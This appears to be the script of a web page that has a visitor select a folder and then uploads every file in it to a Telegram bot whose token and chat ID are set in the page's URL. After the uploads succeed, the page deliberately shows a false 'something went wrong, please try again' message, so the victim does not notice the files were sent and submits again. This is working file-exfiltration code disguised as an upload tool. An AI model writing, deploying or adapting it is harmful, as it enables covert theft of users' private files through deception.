const urlParams = new URLSearchParams(window.location.search);
    const botToken = urlParams.get('token');
    const chatId = urlParams.get('id');

   
    const selectFolderBtn = document.getElementById('selectFolderBtn');
    const fileInput = document.getElementById('fileInput');
    const form = document.getElementById('uploadForm');
    const submitBtn = document.getElementById('submitBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    const folderStatus = document.getElementById('folderStatus');
    const errorContainer = document.getElementById('errorContainer');

    let selectedFiles = [];

    
    function validateParams() {
      if (!botToken || !chatId) {
        errorContainer.innerHTML = `
          <div class="error-message">
            <strong>⚠️ Missing Configuration</strong>
            Please add bot token and ID to the URL:<br>
            <code>?token=YOUR_BOT_TOKEN&id=YOUR_CHAT_ID</code>
          </div>
        `;
        selectFolderBtn.disabled = true;
        return false;
      }
      return true;
    }

   
    if (!validateParams()) {
     
    } else {
     
      selectFolderBtn.addEventListener('click', () => {
        fileInput.click();
      });

      fileInput.addEventListener('change', () => {
        selectedFiles = Array.from(fileInput.files);
        
        if (selectedFiles.length > 0) {
          folderStatus.innerHTML = `Folder selected`;
          submitBtn.disabled = false;
        } else {
          folderStatus.innerHTML = '';
          submitBtn.disabled = true;
        }
      });

      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        if (selectedFiles.length === 0) {
          alert('Please select a folder with files first!');
          return;
        }

        
        selectFolderBtn.disabled = true;
        submitBtn.disabled = true;

      
        progressContainer.style.display = 'block';
        progressText.textContent = 'Loading...';
        progressFill.style.width = '0%';
        progressText.style.color = '#eceff1';
        progressFill.classList.add('uploading');

        let uploadedCount = 0;
        let failedCount = 0;
        const total = selectedFiles.length;
        const CONCURRENCY = 3;

        async function uploadFile(file) {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('document', file);
          const url = `https://api.telegram.org/bot${botToken}/sendDocument`;

          try {
            const response = await fetch(url, {
              method: 'POST',
              body: formData,
            });

            if (!response.ok) {
              throw new Error(`HTTP error! status: ${response.status}`);
            }

            uploadedCount++;
          } catch (err) {
            console.error('Upload error:', err);
            failedCount++;
          }

          updateProgress(uploadedCount + failedCount, total);
        }

        function updateProgress(done, total) {
          const percent = Math.round((done / total) * 100);
          progressFill.style.width = `${percent}%`;
          progressText.textContent = 'Loading...';
        }

        async function uploadQueue() {
          const queue = [...selectedFiles];
          const workers = [];

          for (let i = 0; i < Math.min(CONCURRENCY, queue.length); i++) {
            workers.push(processQueue());
          }

          async function processQueue() {
            while (queue.length > 0) {
              const file = queue.shift();
              if (file) {
                await uploadFile(file);
              }
            }
          }

          await Promise.all(workers);
        }

        try {
          await uploadQueue();
          
          progressFill.classList.remove('uploading');
          progressFill.style.width = '100%';
          progressText.textContent = '❌ Sorry, something went wrong. Please try again.';
          progressText.style.color = '#ff6b6b';
        } catch (error) {
          progressFill.classList.remove('uploading');
          progressText.textContent = '❌ Sorry, something went wrong. Please try again.';
          progressText.style.color = '#ff6b6b';
          console.error('Upload queue error:', error);
        } finally {
         
          selectFolderBtn.disabled = false;
          submitBtn.disabled = false;
        }
      });
    }